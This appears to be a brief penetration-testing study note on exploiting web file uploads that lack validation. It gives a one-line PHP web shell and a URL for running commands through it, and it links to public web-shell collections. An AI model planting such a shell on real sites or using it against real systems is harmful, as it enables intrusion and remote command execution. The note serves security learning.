# Basic Exploitation
-----

## Absent Validation
- A lot of web applications do not have requirements of what type of files can be uploaded. We can take advantage of this to upload a shell script to gain a reverse shell.

- First, we need to identify the framework used. This can be easily done by Wappalyzer

- Then we identify the vulnerability. Assuming the applicaion uses PHP, we can upload a simple file `test.php` to print out a message `<?php echo "Hello World";?>

## Upload Exploitation
- Depending on the framework used, we can upload corresponding webshells to the application. SecList/Web-Shells does provide a lot of options for us:

	- [phpbash](https://github.com/Arrexel/phpbash/blob/master/phpbash.php) is one of the most common and convenient ways to get a webshell.
	- We can write custom webshell `shell.php` to perform remote code execution (RCE): `<?php system($_REQUEST['cmd']); ?>`. Once the file is uploaded, we can run any command: `http://$TARGET/uploads/shell.php?cmd=id`
	- Reverse Shell: We can also create a reverse shell to connect back to our machine to perform further attacks.
